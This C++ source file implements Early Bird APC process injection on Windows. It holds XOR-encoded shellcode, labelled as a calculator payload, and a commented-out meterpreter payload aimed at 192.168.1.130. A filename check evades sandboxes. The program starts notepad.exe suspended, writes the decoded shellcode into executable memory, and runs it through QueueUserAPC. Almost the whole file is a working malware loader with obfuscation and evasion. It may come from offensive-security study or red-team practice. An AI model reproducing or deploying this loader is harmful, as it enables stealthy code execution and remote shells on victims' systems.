// earlybird.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "Windows.h"
#include <stdio.h>
#include "struct.h"

//#define LOGWIN32API if (GetLastError()  != 0) printf("[-] WIN32API failed with error code: %d\n",GetLastError())
//#define WIN32_ERR(API) std::cout << "{!!} " << #API << " failed with error: " << GetLastError() << std::endl;
//#define NTAPI_ERR(API, status) std::cout << "{!!} " << #API << " failed with status: " << std::hex << status << std::endl;
#define WIN32_ERR(API, ...) if (GetLastError()  != 0) printf("[-] Error\n\\___ %s failed with error %d\n", #API, GetLastError(), ##__VA_ARGS__)
#define NTAPI_ERR(API, Status, ...) if (Status  != 0) printf("[-] Error\n\\___ %s failed with error %d\n", #API, Status, ##__VA_ARGS__)

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define check(x, ...) if (x == 0) printf("[-] Error\n\\___ %s is empty!\n", #x, ##__VA_ARGS__)

int main(int argc, char* argv[])
{
	NTSTATUS success;

	//Basic Sandbox evasion
	// Check if process name contains the string earlybird2.exe
	if (strstr(argv[0], "earlybird2.exe") == 0)
	{
		return 0;
	}
	// xor_calc
	unsigned char payload[] = { 0x91, 0x31, 0xf0, 0x81, 0x93, 0x9a, 0xa5, 0x74, 0x6b, 0x65, 0x24, 0x34, 0x2c, 0x29, 0x21, 0x34, 0x35, 0x3a, 0x54, 0xa6, 0xe, 0x2d, 0xee, 0x37, 0xd, 0x31, 0xf8, 0x37, 0x7b, 0x3a, 0xee, 0x26, 0x4b, 0x2d, 0xee, 0x17, 0x3d, 0x31, 0x7c, 0xd2, 0x29, 0x38, 0x28, 0x45, 0xa2, 0x2d, 0x54, 0xa5, 0xc1, 0x45, 0x12, 0x19, 0x61, 0x5e, 0x45, 0x35, 0xaa, 0xac, 0x68, 0x24, 0x6c, 0xb8, 0x91, 0x88, 0x31, 0x33, 0x34, 0x3c, 0xe0, 0x37, 0x45, 0xee, 0x2f, 0x45, 0x3b, 0x64, 0xb3, 0xf9, 0xe5, 0xfc, 0x6b, 0x65, 0x65, 0x2d, 0xe8, 0xb9, 0x7, 0x2, 0x2b, 0x73, 0xb5, 0x24, 0xe0, 0x2d, 0x7d, 0x21, 0xe6, 0x39, 0x53, 0x2c, 0x62, 0xa2, 0x86, 0x22, 0x23, 0x9a, 0xac, 0x24, 0xe6, 0x4d, 0xfb, 0x2d, 0x62, 0xa4, 0x28, 0x45, 0xa2, 0x2d, 0x54, 0xa5, 0xc1, 0x38, 0xb2, 0xac, 0x6e, 0x33, 0x64, 0xb5, 0x53, 0x85, 0x10, 0x94, 0x21, 0x7a, 0x3f, 0x41, 0x6b, 0x37, 0x5c, 0xa5, 0x1e, 0xbd, 0x3d, 0x21, 0xe6, 0x39, 0x57, 0x2c, 0x62, 0xa2, 0x3, 0x35, 0xe0, 0x69, 0x2d, 0x21, 0xe6, 0x39, 0x6f, 0x2c, 0x62, 0xa2, 0x24, 0xff, 0x6f, 0xed, 0x2d, 0x64, 0xbd, 0x38, 0x2b, 0x24, 0x3b, 0x2c, 0x3c, 0x2e, 0x2a, 0x3d, 0x24, 0x3c, 0x2c, 0x23, 0x3b, 0xe6, 0x8f, 0x52, 0x24, 0x26, 0x94, 0x85, 0x3d, 0x24, 0x34, 0x23, 0x3b, 0xee, 0x71, 0x9b, 0x32, 0x8b, 0x94, 0x9a, 0x38, 0x2d, 0xd7, 0x78, 0x73, 0x65, 0x63, 0x72, 0x65, 0x74, 0x6b, 0x2d, 0xe8, 0xe8, 0x6c, 0x78, 0x73, 0x65, 0x22, 0xc8, 0x54, 0xff, 0x4, 0xe2, 0x9a, 0xb0, 0xd6, 0x99, 0x6e, 0x4f, 0x69, 0x33, 0xdf, 0xd2, 0xfe, 0xd8, 0xf8, 0x9a, 0xb8, 0x31, 0xf0, 0xa1, 0x4b, 0x4e, 0x63, 0x8, 0x61, 0xe5, 0x9e, 0x85, 0x18, 0x7c, 0xc8, 0x22, 0x70, 0x0, 0xa, 0x1e, 0x6b, 0x3c, 0x24, 0xec, 0xb7, 0x86, 0xa6, 0x6, 0x2, 0x1e, 0x6, 0x5a, 0xe, 0x1d, 0x0, 0x65 };
	//xor_meterpreter - 192.168.1.130
	//unsigned char payload[] = { 0x91, 0x31, 0xf0, 0x81, 0x93, 0x9a, 0xa9, 0x74, 0x6b, 0x65, 0x24, 0x34, 0x2c, 0x29, 0x21, 0x2d, 0x52, 0xa0, 0x34, 0x11, 0x23, 0xee, 0x37, 0x5, 0x25, 0xf2, 0x21, 0x7d, 0x35, 0x3a, 0xee, 0x26, 0x4b, 0x2d, 0xee, 0x17, 0x3d, 0x31, 0x7c, 0xd2, 0x29, 0x38, 0x28, 0x45, 0xa2, 0x2d, 0x54, 0xa5, 0xc1, 0x45, 0x12, 0x19, 0x61, 0x5e, 0x45, 0x35, 0xaa, 0xac, 0x68, 0x24, 0x6c, 0xb8, 0x91, 0x88, 0x31, 0x3a, 0xee, 0x26, 0x4b, 0xee, 0x27, 0x59, 0x25, 0x78, 0xa3, 0x24, 0x32, 0x14, 0xe4, 0xc, 0x73, 0x6e, 0x67, 0x6a, 0xe8, 0xb, 0x73, 0x65, 0x63, 0xf9, 0xe5, 0xfc, 0x6b, 0x65, 0x65, 0x2d, 0xe8, 0xb9, 0x7, 0x2, 0x2b, 0x73, 0xb5, 0x24, 0xe0, 0x2d, 0x7d, 0x21, 0xe6, 0x39, 0x53, 0x2c, 0x62, 0xa2, 0x86, 0x22, 0x26, 0x54, 0xac, 0x2d, 0x92, 0xb0, 0x32, 0xee, 0x57, 0xfa, 0x2d, 0x75, 0xbd, 0x2d, 0x54, 0xa5, 0xc1, 0x38, 0xb2, 0xac, 0x6e, 0x33, 0x64, 0xb5, 0x53, 0x85, 0x10, 0x94, 0x21, 0x7a, 0x3f, 0x41, 0x6b, 0x37, 0x5c, 0xa5, 0x1e, 0xbd, 0x3d, 0x21, 0xe6, 0x39, 0x57, 0x2c, 0x62, 0xa2, 0x3, 0x35, 0xe0, 0x69, 0x2d, 0x21, 0xe6, 0x39, 0x6f, 0x2c, 0x62, 0xa2, 0x24, 0xff, 0x6f, 0xed, 0x2d, 0x64, 0xbd, 0x38, 0x2b, 0x24, 0x3b, 0x2c, 0x3c, 0x2e, 0x2a, 0x3d, 0x24, 0x3c, 0x2c, 0x23, 0x3b, 0xe6, 0x8f, 0x52, 0x24, 0x26, 0x94, 0x85, 0x3d, 0x24, 0x34, 0x23, 0x3b, 0xee, 0x71, 0x9b, 0x2e, 0x8b, 0x94, 0x9a, 0x38, 0x2c, 0xd3, 0xe, 0x0, 0x57, 0x3c, 0x41, 0x57, 0x74, 0x6b, 0x24, 0x33, 0x2c, 0xe4, 0x9f, 0x3b, 0xe4, 0x8f, 0xd2, 0x64, 0x74, 0x6b, 0x2c, 0xec, 0x80, 0x24, 0xc5, 0x71, 0x65, 0x62, 0xc9, 0xa5, 0xdc, 0x6a, 0xe7, 0x24, 0x31, 0x24, 0xf0, 0x97, 0x29, 0xea, 0x83, 0x24, 0xce, 0x27, 0x12, 0x43, 0x62, 0x92, 0xac, 0x3f, 0xec, 0x89, 0x1a, 0x64, 0x75, 0x6b, 0x65, 0x3c, 0x24, 0xd7, 0x50, 0xf3, 0xe, 0x63, 0x8d, 0xb0, 0x1e, 0x61, 0x24, 0x3b, 0x35, 0x3d, 0x34, 0x42, 0xac, 0x2e, 0x43, 0xa5, 0x3c, 0x94, 0xa5, 0x2d, 0xec, 0xaf, 0x31, 0x8c, 0xa5, 0x2b, 0xfb, 0xa4, 0x35, 0xd1, 0x8f, 0x6a, 0xba, 0x8d, 0x86, 0xa6, 0x2d, 0xea, 0xb5, 0xf, 0x64, 0x2a, 0x3d, 0x29, 0xec, 0x8f, 0x31, 0xfa, 0x9c, 0x22, 0xc8, 0xfc, 0xd1, 0x1f, 0x4, 0x9a, 0xb0, 0xe8, 0xb9, 0x7, 0x69, 0x2a, 0x8d, 0xab, 0x1, 0x8e, 0xd, 0x95, 0xd0, 0xcf, 0x2f, 0x8c, 0xb0, 0x2b, 0xf1, 0x89, 0x64, 0x23, 0xec, 0x87, 0x28, 0x5c, 0xb0, 0x19, 0x61, 0x22, 0x2a, 0x2d, 0xfd, 0x92, 0x24, 0xdf, 0x67, 0xb4, 0xb1, 0x2c, 0x9a, 0xb6, 0x3a, 0xe6, 0xb0, 0x4b, 0x3b, 0xec, 0x93, 0x7, 0x39, 0x32, 0x3c, 0xb, 0x72, 0x75, 0x74, 0x6b, 0x24, 0x3d, 0x2d, 0xe4, 0x8b, 0x3b, 0x54, 0xaa, 0x33, 0xdf, 0x2c, 0xcf, 0x36, 0x80, 0x9a, 0xb8, 0x31, 0xfa, 0xa6, 0x2a, 0xfb, 0xa2, 0x39, 0x5a, 0xac, 0x2c, 0xec, 0x9d, 0x31, 0xfa, 0xbf, 0x2b, 0xfb, 0x9c, 0x35, 0xd1, 0x67, 0xbc, 0xad, 0x32, 0x86, 0xa6, 0x2d, 0x62, 0xb1, 0x2d, 0x5d, 0xad, 0x2d, 0xe0, 0x93, 0x18, 0x98, 0x32, 0x9a, 0x84 };


	// xor key
	char key[] = "mysecretkeee";
	unsigned int payload_len = sizeof(payload);
	SIZE_T payload_len2 = sizeof(payload);

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	// Launch notepad process in suspended state
	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	WIN32_ERR(CreateProcessA());
	okay("Process created with pid: %d", pi.dwProcessId);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;
	LPVOID shellAddress = NULL;


	success = pNtAllocateVirtualMemory(victimProcess,
		&shellAddress,
		NULL,
		&payload_len2,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);


	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

	XOR((char*)payload, payload_len, (char*)key, sizeof(key));

	success = pNtWriteVirtualMemory(victimProcess, shellAddress, (PVOID)payload, payload_len, NULL);

	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);

	ResumeThread(threadHandle);

	return 0;
}


